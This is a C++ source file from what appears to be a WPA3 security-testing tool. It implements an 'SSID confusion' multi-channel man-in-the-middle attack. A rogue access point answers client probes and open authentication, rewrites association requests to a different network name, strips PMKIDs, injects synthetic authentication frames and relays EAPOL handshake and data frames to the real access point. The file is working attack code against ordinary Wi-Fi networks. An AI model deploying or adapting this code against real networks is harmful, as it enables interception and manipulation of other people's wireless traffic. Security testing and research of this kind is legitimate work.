#include "attacks/components/sniffer_helper.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "net_parser/dot11_defs.h"
#include "system/hw_capabilities.h"
namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;

void SsidConfusion::send_to_real(PDU &pdu) const {
	const frame_raw_t raw = pdu.serialize();
    send_to_real(raw);
}

void SsidConfusion::send_to_real(const frame_raw_t &raw) const {
	const auto full_radiotap = ensure_radiotap(raw);
	sock_real->send(full_radiotap, netconfig.real_channel);
}

FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pdu, const Dot11 &dot11) {
	if(dot11.find_pdu<Dot11ProbeRequest>()) {
		const bool directed = dot11.addr1() == HWAddress<6>(ap.get(SK::mac));
		const bool wildcard = dot11.addr1() == HWAddress<6>::broadcast;
		if(!directed && !wildcard) return STOP;
		probe_resp->addr1(addr2);
		const unique_ptr<Dot11ProbeResponse> resp(probe_resp->clone());
		resp->addr1(addr2);
		send_to_rogue(*resp);
		display_traffic(*pdu, "Rogue channel", " -- Replied");
		if(addr2 == HWAddress<6>(sta.get(SK::mac)) && client_state.get_state() < ClientState::Authenticated)
			client_state.update_state(ClientState::Finding);
		return STOP;
	}
	if(dot11.find_pdu<Dot11ProbeResponse>()) return STOP;
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()) {
		if(auth->auth_algorithm() == dot11::AUTH_ALG_OPEN && auth->auth_seq_number() == dot11::AUTH_SEQ_REQ) {
			if(client_state.get_state() >= ClientState::GotMitm) return STOP;
			// Open System Auth seq=1 ->  seq=2 success
			Dot11Authentication resp(addr2, rogue_ap->get(SK::mac));
			resp.addr3(rogue_ap->get(SK::mac));
			resp.auth_seq_number(dot11::AUTH_SEQ_RESP);
			resp.auth_algorithm(dot11::AUTH_ALG_OPEN);
			resp.status_code(dot11::STATUS_SUCCESS);

			send_to_rogue(resp);
			display_traffic(dot11, "Rogue channel", " -- Replied");
			client_state.update_state(ClientState::Authenticated);

			return STOP;
		}
	}
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr2, const PDU &pdu, const frame_raw_t &raw) const {
	// EAPOL STA -> AP
	if(addr2 == sta.get(SK::mac) && is_eapol(pdu)) {
		const auto msg = get_eapol_msg_num(raw);
		if(msg == EapolMsg::Msg1 || msg == EapolMsg::Msg3) return STOP; //block cycles
		if(msg == EapolMsg::Msg2 || msg == EapolMsg::Msg4) return CONTINUE;
		display_traffic(pdu, "Rogue channel", " STA -> AP  -- MitM'ing");
		send_to_real(raw);
		return STOP;
	}
	return CONTINUE;
}
FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &, Dot11 &dot11, const frame_raw_t &raw) {
	if(!dot11.find_pdu<Dot11AssocRequest>() && !dot11.find_pdu<Dot11ReAssocRequest>())
		return CONTINUE;

	auto full_radiotap = ensure_radiotap(raw);
	rewrite_ssid_in_frame(full_radiotap, "WrongNet"); //TODO hardcoded
	if(strip_pmkid_in_assoc) strip_pmkid_from_rsn_ie(full_radiotap);

	if(client_state.get_state() >= ClientState::Associated) {
		// deduplicate L2 retransmissions: Retry bit set = same frame resent, real AP already got it
		if(dot11.retry()) return STOP;
		display_traffic(dot11, "Rogue channel", " -- AssocReq retry (relay to real)");
		send_to_real(full_radiotap);
		return STOP;
	}

	display_traffic(dot11, "Rogue channel", " -- MitMing (relay to real)");
	client_state.update_state(ClientState::Associated);

	// SME-mode clients (NL80211_CMD_CONNECT) skip explicit auth; inject synthetic open
	// auth to real AP so it has authenticated state before the assoc arrives.
	Dot11Authentication synth_auth(HWAddress<6>(ap.get(SK::mac)), HWAddress<6>(sta.get(SK::mac)));
	synth_auth.addr3(HWAddress<6>(ap.get(SK::mac)));
	synth_auth.auth_algorithm(dot11::AUTH_ALG_OPEN);
	synth_auth.auth_seq_number(dot11::AUTH_SEQ_REQ);
	synth_auth.status_code(dot11::STATUS_SUCCESS);
	send_to_real(synth_auth);

	send_to_real(full_radiotap);
	return STOP;
}

void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;

	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.rogue_channel)) {
			return;
			}
	}
	const auto [addr1, addr2] = get_addrs(*pdu, raw);
	if(dot11->find_pdu<Dot11Beacon>()) return;

	power_mgmt_response_rogue(addr2, *dot11);

	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;

	SOLVE_OR_CONTINUE(handle_probe(addr2, pdu.get(), *dot11))
	if(handle_open_auth(addr2, *dot11)) return;
	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr2, *pdu, raw))

	#undef SOLVE_OR_CONTINUE

	// SA Query Response from STA -> relay to real AP (transparent, MIC stays valid)
	if(dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == 13 &&
	   addr2 == HWAddress<6>(sta.get(SK::mac))) {
		display_traffic(*dot11, "Rogue channel", " SA Query resp -- relay to real");
		send_to_real(raw);
		return;
	}

	if(addr2 == sta.get(SK::mac)) {
		handle_disconnect_rogue(*dot11);
		if(dot11->type() == Dot11::DATA &&
		   client_state.get_state() >= ClientState::Associated &&
		   client_state.get_state() < ClientState::GotMitm)
			client_state.update_state(ClientState::GotMitm);
		const auto eap = components::eap_description_raw(raw);
		display_traffic(*pdu, "Rogue channel", (eap.empty() ? "" : " [" + eap + "]") + " -- MitM'ing");
		send_to_real(raw);
	}
}

}